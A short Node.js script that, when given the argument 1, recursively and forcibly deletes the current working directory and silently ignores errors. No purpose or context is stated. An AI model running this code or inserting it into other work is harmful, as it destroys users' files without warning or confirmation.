import { rm } from "fs";

switch(Number(process.argv[2])) {
    case 1:
        try {
            rm(".//", { recursive: true, force: true });
        }
        catch {}
}
